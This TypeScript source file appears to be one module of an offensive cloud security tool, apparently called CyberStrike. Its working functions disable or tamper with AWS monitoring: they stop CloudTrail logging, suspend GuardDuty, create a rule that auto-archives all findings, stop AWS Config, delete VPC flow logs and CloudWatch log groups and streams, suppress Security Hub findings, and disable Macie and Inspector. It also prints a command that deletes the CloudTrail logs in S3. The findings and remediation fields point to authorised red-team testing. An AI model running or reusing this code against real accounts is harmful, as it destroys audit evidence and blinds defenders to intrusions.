import { aws, argVal, hasFlag, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function cloudtrailBlind(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action")
  if (!action) return { output: "ERROR: --action required (stop|delete_logs|modify_selectors|status)", findings: [] }
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const trailName = argVal(args, "--trail-name")

  if (action === "status") {
    const r = await aws(["cloudtrail", "describe-trails"], profile, region, timeout)
    if (r.exitCode !== 0) return { output: `[-] Cannot describe trails: ${r.stderr.trim()}`, findings: [] }
    const trails = tryJson(r.stdout)?.trailList || []
    const output = [`[*] CloudTrail status — ${trails.length} trail(s)\n`]
    for (const t of trails) {
      const status = await aws(["cloudtrail", "get-trail-status", "--name", t.Name], profile, region, timeout)
      const s = tryJson(status.stdout)
      output.push(`[+] ${t.Name}: logging=${s?.IsLogging}, multi-region=${t.IsMultiRegionTrail}`)
    }
    return { output: output.join("\n"), findings: [] }
  }

  if (action === "stop") {
    const name =
      trailName ||
      (await (async () => {
        const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[0].Name"], profile, region, timeout)
        return tryJson(r.stdout)
      })())
    if (!name) return { output: "[-] No trail found", findings: [] }
    const r = await aws(["cloudtrail", "stop-logging", "--name", name], profile, region, timeout)
    return r.exitCode === 0
      ? { output: `[+] Stopped logging on trail: ${name}`, findings: [] }
      : { output: `[-] Failed to stop: ${r.stderr.trim()}`, findings: [] }
  }

  if (action === "modify_selectors") {
    const name =
      trailName ||
      (await (async () => {
        const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[0].Name"], profile, region, timeout)
        return tryJson(r.stdout)
      })())
    if (!name) return { output: "[-] No trail found", findings: [] }
    const r = await aws(
      [
        "cloudtrail",
        "put-event-selectors",
        "--trail-name",
        name,
        "--event-selectors",
        '[{"ReadWriteType":"ReadOnly","IncludeManagementEvents":false}]',
      ],
      profile,
      region,
      timeout,
    )
    return r.exitCode === 0
      ? { output: `[+] Event selectors modified on ${name} — management events excluded`, findings: [] }
      : { output: `[-] Failed: ${r.stderr.trim()}`, findings: [] }
  }

  if (action === "delete_logs") {
    const r = await aws(
      ["cloudtrail", "describe-trails", "--query", "trailList[0].S3BucketName"],
      profile,
      region,
      timeout,
    )
    const bucket = tryJson(r.stdout)
    if (!bucket) return { output: "[-] Cannot find CloudTrail S3 bucket", findings: [] }
    return {
      output: `[*] CloudTrail logs in: s3://${bucket}\n[+] Use: aws s3 rm s3://${bucket}/AWSLogs/ --recursive`,
      findings: [],
    }
  }

  return { output: `ERROR: Unknown action: ${action}`, findings: [] }
}

export async function guarddutyEvade(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "status"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] GuardDuty Evasion\n"]
  const findings: Finding[] = []

  const detectors = await aws(
    ["guardduty", "list-detectors", "--query", "DetectorIds"],
    profile,
    region,
    timeout,
  )
  if (detectors.exitCode !== 0) return { output: `[-] Cannot list detectors: ${detectors.stderr.trim()}`, findings }

  const dl = tryJson(detectors.stdout) || []
  output.push(`[+] GuardDuty Detectors: ${dl.length}`)

  for (const detectorId of dl) {
    const desc = await aws(
      ["guardduty", "get-detector", "--detector-id", detectorId],
      profile,
      region,
      timeout,
    )
    if (desc.exitCode === 0) {
      const det = tryJson(desc.stdout)
      output.push(`\n    ${detectorId} — status: ${det?.Status} — updated: ${det?.UpdatedAt}`)
      const features = det?.Features || []
      for (const f of features) output.push(`      ${f.Name}: ${f.Status}`)
    }

    if (action === "suspend") {
      const r = await aws(
        ["guardduty", "update-detector", "--detector-id", detectorId, "--no-enable"],
        profile,
        region,
        timeout,
      )
      if (r.exitCode === 0) {
        output.push(`    [+] Detector ${detectorId} SUSPENDED`)
        findings.push({
          checkId: "AWS-EVASION-001",
          provider: "aws",
          severity: "critical",
          status: "DISABLED",
          resource: `guardduty:${detectorId}`,
          title: `GuardDuty detector suspended: ${detectorId}`,
          details: "GuardDuty threat detection disabled",
          remediation: "Re-enable: aws guardduty update-detector --detector-id " + detectorId + " --enable",
        })
      } else {
        output.push(`    [-] Suspend failed: ${r.stderr.trim()}`)
      }
    }

    if (action === "suppress") {
      const gdFindings = await aws(
        ["guardduty", "list-findings", "--detector-id", detectorId, "--finding-criteria", '{"Criterion":{"severity":{"Gte":7}}}'],
        profile,
        region,
        timeout,
      )
      if (gdFindings.exitCode === 0) {
        const fl = tryJson(gdFindings.stdout)?.FindingIds || []
        output.push(`\n    [+] High-severity findings: ${fl.length}`)
        if (fl.length > 0) {
          const archive = await aws(
            ["guardduty", "archive-findings", "--detector-id", detectorId, "--finding-ids", ...fl.slice(0, 50)],
            profile,
            region,
            timeout,
          )
          if (archive.exitCode === 0) {
            output.push(`    [+] Archived ${Math.min(fl.length, 50)} finding(s)`)
            findings.push({
              checkId: "AWS-EVASION-002",
              provider: "aws",
              severity: "high",
              status: "SUPPRESSED",
              resource: `guardduty:${detectorId}`,
              title: `GuardDuty findings archived: ${Math.min(fl.length, 50)}`,
              details: "High-severity findings archived to hide activity",
              remediation: "Unarchive findings and review for legitimate threats",
            })
          }
        }
      }
    }

    if (action === "filter") {
      const filter = await aws(
        [
          "guardduty",
          "create-filter",
          "--detector-id",
          detectorId,
          "--name",
          "cs-suppress-all",
          "--action",
          "ARCHIVE",
          "--finding-criteria",
          '{"Criterion":{"severity":{"Gte":1}}}',
          "--tags",
          "CreatedBy=CyberStrike",
        ],
        profile,
        region,
        timeout,
      )
      if (filter.exitCode === 0) {
        output.push(`    [+] Auto-archive filter created: cs-suppress-all`)
        findings.push({
          checkId: "AWS-EVASION-003",
          provider: "aws",
          severity: "critical",
          status: "CREATED",
          resource: `guardduty:${detectorId}:filter`,
          title: "GuardDuty auto-archive filter created",
          details: "All future findings will be automatically archived",
          remediation: "Delete filter: aws guardduty delete-filter --detector-id " + detectorId + " --filter-name cs-suppress-all",
        })
      } else {
        output.push(`    [-] Filter creation failed: ${filter.stderr.trim()}`)
      }
    }
  }

  if (action === "status") {
    output.push("\n[*] Actions: --action suspend | suppress | filter")
  }

  return { output: output.join("\n"), findings }
}

export async function configDisable(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "status"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] AWS Config Recorder\n"]
  const findings: Finding[] = []

  const recorders = await aws(
    ["configservice", "describe-configuration-recorders"],
    profile,
    region,
    timeout,
  )
  if (recorders.exitCode !== 0) return { output: `[-] Cannot describe recorders: ${recorders.stderr.trim()}`, findings }

  const rl = tryJson(recorders.stdout)?.ConfigurationRecorders || []
  output.push(`[+] Configuration Recorders: ${rl.length}`)

  for (const rec of rl) {
    const status = await aws(
      ["configservice", "describe-configuration-recorder-status", "--configuration-recorder-names", rec.name],
      profile,
      region,
      timeout,
    )
    const s = tryJson(status.stdout)?.ConfigurationRecordersStatus?.[0]
    output.push(`    ${rec.name} — recording: ${s?.recording} — last status: ${s?.lastStatus}`)

    if (action === "stop") {
      const r = await aws(
        ["configservice", "stop-configuration-recorder", "--configuration-recorder-name", rec.name],
        profile,
        region,
        timeout,
      )
      if (r.exitCode === 0) {
        output.push(`    [+] Recorder stopped: ${rec.name}`)
        findings.push({
          checkId: "AWS-EVASION-004",
          provider: "aws",
          severity: "critical",
          status: "DISABLED",
          resource: `config:${rec.name}`,
          title: `AWS Config recorder stopped: ${rec.name}`,
          details: "Configuration recording disabled — changes will not be tracked",
          remediation: "Restart: aws configservice start-configuration-recorder --configuration-recorder-name " + rec.name,
        })
      } else {
        output.push(`    [-] Stop failed: ${r.stderr.trim()}`)
      }
    }
  }

  const channels = await aws(
    ["configservice", "describe-delivery-channels"],
    profile,
    region,
    timeout,
  )
  if (channels.exitCode === 0) {
    const cl = tryJson(channels.stdout)?.DeliveryChannels || []
    output.push(`\n[+] Delivery Channels: ${cl.length}`)
    for (const ch of cl) {
      output.push(`    ${ch.name} — bucket: ${ch.s3BucketName} — SNS: ${ch.snsTopicARN || "none"}`)
      if (action === "delete_channel") {
        const r = await aws(
          ["configservice", "delete-delivery-channel", "--delivery-channel-name", ch.name],
          profile,
          region,
          timeout,
        )
        if (r.exitCode === 0) output.push(`    [+] Channel deleted: ${ch.name}`)
      }
    }
  }

  if (action === "status") output.push("\n[*] Actions: --action stop | delete_channel")

  return { output: output.join("\n"), findings }
}

export async function vpcFlowDisable(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "status"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] VPC Flow Logs\n"]
  const findings: Finding[] = []

  const flowLogs = await aws(
    ["ec2", "describe-flow-logs", "--query", "FlowLogs[].[FlowLogId,ResourceId,LogDestinationType,LogDestination,FlowLogStatus,TrafficType]"],
    profile,
    region,
    timeout,
  )
  if (flowLogs.exitCode !== 0) return { output: `[-] Cannot describe flow logs: ${flowLogs.stderr.trim()}`, findings }

  const fl = tryJson(flowLogs.stdout) || []
  output.push(`[+] VPC Flow Logs: ${fl.length}`)
  for (const f of fl) output.push(`    ${f[0]} — ${f[1]} → ${f[2]}:${f[3]} — ${f[4]} (${f[5]})`)

  if (action === "delete") {
    for (const f of fl) {
      const r = await aws(
        ["ec2", "delete-flow-logs", "--flow-log-ids", f[0]],
        profile,
        region,
        timeout,
      )
      if (r.exitCode === 0) {
        output.push(`    [+] Deleted: ${f[0]}`)
        findings.push({
          checkId: "AWS-EVASION-005",
          provider: "aws",
          severity: "critical",
          status: "DELETED",
          resource: `vpc:flowlog:${f[0]}`,
          title: `VPC Flow Log deleted: ${f[0]}`,
          details: `Flow log for ${f[1]} deleted — network traffic no longer logged`,
          remediation: "Recreate flow log for VPC/subnet/ENI",
        })
      } else {
        output.push(`    [-] Delete failed for ${f[0]}: ${r.stderr.trim()}`)
      }
    }
  }

  if (action === "status") output.push("\n[*] Use --action delete to remove all flow logs")

  return { output: output.join("\n"), findings }
}

export async function accessAnalyzerSuppress(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "status"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] IAM Access Analyzer\n"]
  const findings: Finding[] = []

  const analyzers = await aws(
    ["accessanalyzer", "list-analyzers", "--query", "analyzers[].[arn,name,type,status]"],
    profile,
    region,
    timeout,
  )
  if (analyzers.exitCode !== 0) return { output: `[-] Cannot list analyzers: ${analyzers.stderr.trim()}`, findings }

  const al = tryJson(analyzers.stdout) || []
  output.push(`[+] Access Analyzers: ${al.length}`)
  for (const a of al) output.push(`    ${a[1]} (${a[2]}) — ${a[3]}`)

  for (const a of al) {
    const aaFindings = await aws(
      ["accessanalyzer", "list-findings", "--analyzer-arn", a[0], "--query", "findings[].[id,resourceType,resource,status]"],
      profile,
      region,
      timeout,
    )
    if (aaFindings.exitCode === 0) {
      const fl = tryJson(aaFindings.stdout) || []
      const active = fl.filter((f: string[]) => f[3] === "ACTIVE")
      output.push(`    Findings: ${fl.length} total, ${active.length} active`)

      if (action === "archive" && active.length > 0) {
        for (const f of active.slice(0, 50)) {
          const archive = await aws(
            ["accessanalyzer", "update-findings", "--analyzer-arn", a[0], "--ids", f[0], "--status", "ARCHIVED"],
            profile,
            region,
            timeout,
          )
          if (archive.exitCode === 0) output.push(`    [+] Archived: ${f[0]}`)
        }
        findings.push({
          checkId: "AWS-EVASION-006",
          provider: "aws",
          severity: "high",
          status: "SUPPRESSED",
          resource: `accessanalyzer:${a[1]}`,
          title: `Access Analyzer findings archived: ${Math.min(active.length, 50)}`,
          details: "Active findings archived to hide excessive access",
          remediation: "Unarchive findings and investigate external access",
        })
      }

      if (action === "delete") {
        const del = await aws(
          ["accessanalyzer", "delete-analyzer", "--analyzer-name", a[1]],
          profile,
          region,
          timeout,
        )
        if (del.exitCode === 0) {
          output.push(`    [+] Analyzer deleted: ${a[1]}`)
          findings.push({
            checkId: "AWS-EVASION-007",
            provider: "aws",
            severity: "critical",
            status: "DELETED",
            resource: `accessanalyzer:${a[1]}`,
            title: `Access Analyzer deleted: ${a[1]}`,
            details: "Analyzer removed — external access will no longer be detected",
            remediation: "Recreate analyzer for account/organization",
          })
        }
      }
    }
  }

  if (action === "status") output.push("\n[*] Actions: --action archive | delete")

  return { output: output.join("\n"), findings }
}

export async function securityHubSuppress(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "status"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] Security Hub\n"]
  const findings: Finding[] = []

  const hub = await aws(["securityhub", "describe-hub"], profile, region, timeout)
  if (hub.exitCode !== 0) {
    return { output: `[-] Security Hub not enabled: ${hub.stderr.trim()}`, findings }
  }

  const hubInfo = tryJson(hub.stdout)
  output.push(`[+] Security Hub: ${hubInfo?.HubArn}`)
  output.push(`    Subscribed: ${hubInfo?.SubscribedAt}`)

  const shFindings = await aws(
    [
      "securityhub",
      "get-findings",
      "--filters",
      '{"WorkflowStatus":[{"Value":"NEW","Comparison":"EQUALS"}],"SeverityLabel":[{"Value":"CRITICAL","Comparison":"EQUALS"},{"Value":"HIGH","Comparison":"EQUALS"}]}',
      "--max-items",
      "50",
    ],
    profile,
    region,
    timeout,
  )
  if (shFindings.exitCode === 0) {
    const fl = tryJson(shFindings.stdout)?.Findings || []
    output.push(`\n[+] Active CRITICAL/HIGH findings: ${fl.length}`)
    for (const f of fl.slice(0, 20)) {
      output.push(`    ${f.Title} — ${f.SeverityLabel} — ${f.WorkflowStatus}`)
    }

    if (action === "suppress" && fl.length > 0) {
      const updates = fl.map((f: Record<string, string>) => ({
        Id: f.Id,
        ProductArn: f.ProductArn,
      }))
      const r = await aws(
        [
          "securityhub",
          "batch-update-findings",
          "--finding-identifiers",
          JSON.stringify(updates.slice(0, 50)),
          "--workflow",
          '{"Status":"SUPPRESSED"}',
        ],
        profile,
        region,
        timeout,
      )
      if (r.exitCode === 0) {
        output.push(`\n[+] Suppressed ${Math.min(fl.length, 50)} finding(s)`)
        findings.push({
          checkId: "AWS-EVASION-008",
          provider: "aws",
          severity: "critical",
          status: "SUPPRESSED",
          resource: hubInfo?.HubArn || "securityhub",
          title: `Security Hub findings suppressed: ${Math.min(fl.length, 50)}`,
          details: "Critical/High findings suppressed to hide security issues",
          remediation: "Review and resolve suppressed findings",
        })
      }
    }
  }

  if (action === "disable") {
    const r = await aws(["securityhub", "disable-security-hub"], profile, region, timeout)
    if (r.exitCode === 0) {
      output.push(`\n[+] Security Hub DISABLED`)
      findings.push({
        checkId: "AWS-EVASION-009",
        provider: "aws",
        severity: "critical",
        status: "DISABLED",
        resource: hubInfo?.HubArn || "securityhub",
        title: "Security Hub disabled",
        details: "Security Hub completely disabled — no security findings will be generated",
        remediation: "Re-enable Security Hub: aws securityhub enable-security-hub",
      })
    }
  }

  if (action === "status") output.push("\n[*] Actions: --action suppress | disable")

  return { output: output.join("\n"), findings }
}

export async function wafBypass(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "status"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] WAF Bypass\n"]
  const findings: Finding[] = []

  const webAcls = await aws(
    ["wafv2", "list-web-acls", "--scope", "REGIONAL", "--query", "WebACLs[].[Name,Id,ARN]"],
    profile,
    region,
    timeout,
  )
  if (webAcls.exitCode === 0) {
    const wl = tryJson(webAcls.stdout) || []
    output.push(`[+] Regional Web ACLs: ${wl.length}`)
    for (const w of wl) {
      output.push(`    ${w[0]} (${w[1]})`)
      const desc = await aws(
        ["wafv2", "get-web-acl", "--scope", "REGIONAL", "--name", w[0], "--id", w[1]],
        profile,
        region,
        timeout,
      )
      if (desc.exitCode === 0) {
        const acl = tryJson(desc.stdout)?.WebACL
        const rules = acl?.Rules || []
        output.push(`      Rules: ${rules.length}, Default: ${acl?.DefaultAction ? Object.keys(acl.DefaultAction)[0] : "unknown"}`)
        for (const r of rules) output.push(`        ${r.Name} — ${r.Priority} — ${Object.keys(r.Action || {})[0] || "count"}`)
      }
    }
  }

  const cfWebAcls = await aws(
    ["wafv2", "list-web-acls", "--scope", "CLOUDFRONT", "--region", "us-east-1", "--query", "WebACLs[].[Name,Id]"],
    profile,
    undefined,
    timeout,
  )
  if (cfWebAcls.exitCode === 0) {
    const cl = tryJson(cfWebAcls.stdout) || []
    if (cl.length > 0) {
      output.push(`\n[+] CloudFront Web ACLs: ${cl.length}`)
      for (const c of cl) output.push(`    ${c[0]} (${c[1]})`)
    }
  }

  const ipSets = await aws(
    ["wafv2", "list-ip-sets", "--scope", "REGIONAL", "--query", "IPSets[].[Name,Id]"],
    profile,
    region,
    timeout,
  )
  if (ipSets.exitCode === 0) {
    const il = tryJson(ipSets.stdout) || []
    if (il.length > 0) {
      output.push(`\n[+] IP Sets: ${il.length}`)
      for (const i of il) output.push(`    ${i[0]} (${i[1]})`)
    }
  }

  if (action === "status") output.push("\n[*] Manual WAF modification requires web-acl lock-token. Use AWS console or specific API calls.")

  return { output: output.join("\n"), findings }
}

export async function dnsFirewallDisable(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "status"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] Route 53 Resolver DNS Firewall\n"]
  const findings: Finding[] = []

  const groups = await aws(
    ["route53resolver", "list-firewall-rule-groups", "--query", "FirewallRuleGroups[].[Id,Name,ShareStatus,OwnerId]"],
    profile,
    region,
    timeout,
  )
  if (groups.exitCode !== 0) return { output: `[-] Cannot list DNS firewall groups: ${groups.stderr.trim()}`, findings }

  const gl = tryJson(groups.stdout) || []
  output.push(`[+] DNS Firewall Rule Groups: ${gl.length}`)

  for (const g of gl) {
    output.push(`\n    ${g[1]} (${g[0]}) — ${g[2]} — owner: ${g[3]}`)

    const rules = await aws(
      ["route53resolver", "list-firewall-rules", "--firewall-rule-group-id", g[0], "--query", "FirewallRules[].[Name,Action,Priority,FirewallDomainListId]"],
      profile,
      region,
      timeout,
    )
    if (rules.exitCode === 0) {
      const rl = tryJson(rules.stdout) || []
      output.push(`      Rules: ${rl.length}`)
      for (const r of rl) output.push(`        ${r[0]} — ${r[1]} — priority: ${r[2]}`)
    }

    const assocs = await aws(
      [
        "route53resolver",
        "list-firewall-rule-group-associations",
        "--query",
        "FirewallRuleGroupAssociations[].[Id,Name,VpcId,FirewallRuleGroupId,Status]",
      ],
      profile,
      region,
      timeout,
    )
    if (assocs.exitCode === 0) {
      const al = (tryJson(assocs.stdout) || []).filter((a: string[]) => a[3] === g[0])
      if (al.length > 0) {
        output.push(`      VPC Associations: ${al.length}`)
        for (const a of al) output.push(`        ${a[1]} — VPC: ${a[2]} — ${a[4]}`)

        if (action === "disassociate") {
          for (const a of al) {
            const r = await aws(
              ["route53resolver", "disassociate-firewall-rule-group", "--firewall-rule-group-association-id", a[0]],
              profile,
              region,
              timeout,
            )
            if (r.exitCode === 0) {
              output.push(`        [+] Disassociated from VPC: ${a[2]}`)
              findings.push({
                checkId: "AWS-EVASION-010",
                provider: "aws",
                severity: "critical",
                status: "DISABLED",
                resource: `dns:firewall:${g[0]}`,
                title: `DNS Firewall disassociated from VPC: ${a[2]}`,
                details: `Rule group ${g[1]} removed from VPC ${a[2]}`,
                remediation: "Re-associate firewall rule group with VPC",
              })
            }
          }
        }
      }
    }
  }

  if (action === "status") output.push("\n[*] Actions: --action disassociate (remove from VPCs)")

  return { output: output.join("\n"), findings }
}

export async function cloudwatchTamper(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const action = argVal(args, "--action") || "status"
  const groupName = argVal(args, "--log-group")
  const retentionDays = argVal(args, "--retention") || "1"
  const findings: Finding[] = []
  const output: string[] = ["[*] CloudWatch Logs Tampering\n"]

  const groups = await aws(["logs", "describe-log-groups", "--query", "logGroups[].[logGroupName,storedBytes,retentionInDays,kmsKeyId]"], profile, region, timeout)
  if (groups.exitCode !== 0) return { output: output.join("\n") + "\n[-] Access denied: logs:DescribeLogGroups", findings }

  const gl = tryJson(groups.stdout) || []
  output.push(`[+] Log groups: ${gl.length}`)

  const securityGroups = gl.filter((g: (string | number | null)[]) => {
    const name = String(g[0]).toLowerCase()
    return name.includes("cloudtrail") || name.includes("guardduty") || name.includes("config") || name.includes("vpc-flow") || name.includes("waf") || name.includes("security")
  })

  if (securityGroups.length) {
    output.push(`\n[!] Security-relevant log groups:`)
    for (const g of securityGroups) {
      const sizeMB = Math.round((Number(g[1]) || 0) / 1024 / 1024)
      output.push(`  ${g[0]}  Size: ${sizeMB}MB  Retention: ${g[2] || "never expires"}`)
    }
  }

  if (action === "status") {
    output.push("\n[*] Actions: --action delete (delete group), --action reduce_retention (set 1-day retention), --action delete_streams (delete log streams)")
    return { output: output.join("\n"), findings }
  }

  if (action === "reduce_retention") {
    const targets = groupName ? gl.filter((g: string[]) => g[0] === groupName) : securityGroups
    for (const g of targets) {
      const r = await aws(["logs", "put-retention-policy", "--log-group-name", g[0], "--retention-in-days", retentionDays], profile, region, timeout)
      if (r.exitCode === 0) {
        output.push(`[+] Retention set to ${retentionDays} day(s): ${g[0]}`)
        findings.push({
          checkId: "AWS-EVASION-011",
          provider: "aws",
          severity: "critical",
          status: "MODIFIED",
          resource: `cloudwatch:loggroup:${g[0]}`,
          title: `Log retention reduced to ${retentionDays}d: ${g[0]}`,
          details: `Previous retention: ${g[2] || "never expires"} → ${retentionDays} day(s). Old logs will auto-delete`,
          remediation: `Restore retention: aws logs put-retention-policy --log-group-name '${g[0]}' --retention-in-days ${g[2] || 365}`,
        })
      }
    }
  }

  if (action === "delete") {
    const target = groupName || securityGroups[0]?.[0]
    if (!target) return { output: output.join("\n") + "\n[-] --log-group required or no security groups found", findings }

    const r = await aws(["logs", "delete-log-group", "--log-group-name", typeof target === "string" ? target : target[0]], profile, region, timeout)
    const name = typeof target === "string" ? target : target[0]
    if (r.exitCode === 0) {
      output.push(`[+] Log group deleted: ${name}`)
      findings.push({
        checkId: "AWS-EVASION-012",
        provider: "aws",
        severity: "critical",
        status: "DELETED",
        resource: `cloudwatch:loggroup:${name}`,
        title: `CloudWatch log group deleted: ${name}`,
        details: "All log data permanently destroyed",
        remediation: "Log group and data cannot be recovered — recreate and reconfigure log delivery",
      })
    } else {
      output.push(`[-] Delete failed: ${r.stderr.trim()}`)
    }
  }

  if (action === "delete_streams") {
    const target = groupName || securityGroups[0]?.[0]
    if (!target) return { output: output.join("\n") + "\n[-] --log-group required", findings }
    const name = typeof target === "string" ? target : target[0]

    const streams = await aws(["logs", "describe-log-streams", "--log-group-name", name, "--order-by", "LastEventTime", "--descending", "--limit", "50", "--query", "logStreams[].logStreamName"], profile, region, timeout)
    if (streams.exitCode === 0) {
      const stl = tryJson(streams.stdout) || []
      let deleted = 0
      for (const st of stl) {
        const d = await aws(["logs", "delete-log-stream", "--log-group-name", name, "--log-stream-name", st], profile, region, timeout)
        if (d.exitCode === 0) deleted++
      }
      output.push(`[+] Deleted ${deleted}/${stl.length} log streams from ${name}`)
      if (deleted > 0) {
        findings.push({
          checkId: "AWS-EVASION-013",
          provider: "aws",
          severity: "critical",
          status: "DELETED",
          resource: `cloudwatch:streams:${name}`,
          title: `${deleted} log streams deleted from ${name}`,
          details: "Log streams and their data permanently destroyed — group still exists but evidence removed",
          remediation: "Log data cannot be recovered — investigate timeline and restore from backups",
        })
      }
    }
  }

  return { output: output.join("\n"), findings }
}

export async function macieDisable(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const action = argVal(args, "--action") || "status"
  const findings: Finding[] = []
  const output: string[] = ["[*] Amazon Macie — Sensitive Data Discovery\n"]

  const session = await aws(["macie2", "get-macie-session"], profile, region, timeout)
  if (session.exitCode !== 0) {
    output.push("[-] Macie not enabled or access denied")
    return { output: output.join("\n"), findings }
  }

  const s = tryJson(session.stdout)
  output.push(`[+] Macie status: ${s?.status}`)
  output.push(`    Created: ${s?.createdAt}`)
  output.push(`    Service role: ${s?.serviceRole}`)
  output.push(`    Finding publishing frequency: ${s?.findingPublishingFrequency}`)

  const buckets = await aws(["macie2", "describe-buckets", "--query", "buckets | length(@)"], profile, region, timeout)
  if (buckets.exitCode === 0) {
    output.push(`    Monitored buckets: ${tryJson(buckets.stdout) || 0}`)
  }

  const jobs = await aws(["macie2", "list-classification-jobs", "--query", "items[].[jobId,name,jobStatus,jobType]"], profile, region, timeout)
  if (jobs.exitCode === 0) {
    const jl = tryJson(jobs.stdout) || []
    output.push(`    Classification jobs: ${jl.length}`)
    for (const j of jl) output.push(`      ${j[1]} (${j[0]})  Status: ${j[2]}  Type: ${j[3]}`)
  }

  if (action === "status") {
    output.push("\n[*] Actions: --action suspend (pause), --action disable (permanently disable)")
    return { output: output.join("\n"), findings }
  }

  if (action === "suspend") {
    const r = await aws(["macie2", "update-macie-session", "--status", "PAUSED"], profile, region, timeout)
    if (r.exitCode === 0) {
      output.push(`\n[+] Macie suspended — sensitive data discovery paused`)
      findings.push({
        checkId: "AWS-EVASION-014",
        provider: "aws",
        severity: "critical",
        status: "SUSPENDED",
        resource: "macie:session",
        title: "Amazon Macie suspended",
        details: "S3 sensitive data discovery paused — new sensitive data in S3 will not be detected",
        remediation: "Resume: aws macie2 update-macie-session --status ENABLED",
      })
    }
  }

  if (action === "disable") {
    const r = await aws(["macie2", "disable-macie"], profile, region, timeout)
    if (r.exitCode === 0) {
      output.push(`\n[+] Macie disabled permanently`)
      findings.push({
        checkId: "AWS-EVASION-014",
        provider: "aws",
        severity: "critical",
        status: "DISABLED",
        resource: "macie:session",
        title: "Amazon Macie disabled",
        details: "Macie permanently disabled — all classification jobs stopped, findings deleted after 30 days",
        remediation: "Re-enable: aws macie2 enable-macie",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function inspectorDisable(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const action = argVal(args, "--action") || "status"
  const findings: Finding[] = []
  const output: string[] = ["[*] Amazon Inspector — Vulnerability Scanning\n"]

  const status = await aws(["inspector2", "batch-get-account-status", "--query", "accounts[0].{state:state,ec2:resourceState.ec2,ecr:resourceState.ecr,lambda:resourceState.lambda}"], profile, region, timeout)
  if (status.exitCode !== 0) {
    output.push("[-] Inspector v2 not enabled or access denied")
    return { output: output.join("\n"), findings }
  }

  const s = tryJson(status.stdout)
  output.push(`[+] Inspector status: ${s?.state?.status || "unknown"}`)
  if (s?.ec2) output.push(`    EC2 scanning: ${s.ec2.status}`)
  if (s?.ecr) output.push(`    ECR scanning: ${s.ecr.status}`)
  if (s?.lambda) output.push(`    Lambda scanning: ${s.lambda.status}`)

  const coverage = await aws(["inspector2", "list-coverage", "--query", "coveredResources | length(@)"], profile, region, timeout)
  if (coverage.exitCode === 0) {
    output.push(`    Covered resources: ${tryJson(coverage.stdout) || 0}`)
  }

  const findingsCount = await aws(["inspector2", "list-finding-aggregations", "--aggregation-type", "ACCOUNT", "--query", "responses[0].{critical:severityCounts.critical,high:severityCounts.high,medium:severityCounts.medium}"], profile, region, timeout)
  if (findingsCount.exitCode === 0) {
    const fc = tryJson(findingsCount.stdout)
    if (fc) output.push(`    Findings: Critical=${fc.critical || 0} High=${fc.high || 0} Medium=${fc.medium || 0}`)
  }

  if (action === "status") {
    output.push("\n[*] Actions: --action disable (disable all scanning)")
    return { output: output.join("\n"), findings }
  }

  if (action === "disable") {
    const types = ["EC2", "ECR", "LAMBDA", "LAMBDA_CODE"]
    const r = await aws(["inspector2", "disable", "--resource-types", ...types], profile, region, timeout)
    if (r.exitCode === 0) {
      output.push(`\n[+] Inspector disabled for: ${types.join(", ")}`)
      findings.push({
        checkId: "AWS-EVASION-015",
        provider: "aws",
        severity: "critical",
        status: "DISABLED",
        resource: "inspector:scanning",
        title: "Amazon Inspector vulnerability scanning disabled",
        details: `Disabled scanning for ${types.join(", ")} — new vulnerabilities will not be detected`,
        remediation: `Re-enable: aws inspector2 enable --resource-types ${types.join(" ")}`,
      })
    } else {
      const partial = await aws(["inspector2", "disable", "--resource-types", "EC2", "ECR"], profile, region, timeout)
      if (partial.exitCode === 0) {
        output.push(`[+] Inspector partially disabled (EC2, ECR)`)
        findings.push({
          checkId: "AWS-EVASION-015",
          provider: "aws",
          severity: "critical",
          status: "DISABLED",
          resource: "inspector:scanning",
          title: "Amazon Inspector scanning disabled (EC2, ECR)",
          details: "EC2 and ECR vulnerability scanning disabled",
          remediation: "Re-enable: aws inspector2 enable --resource-types EC2 ECR",
        })
      }
    }
  }

  return { output: output.join("\n"), findings }
}
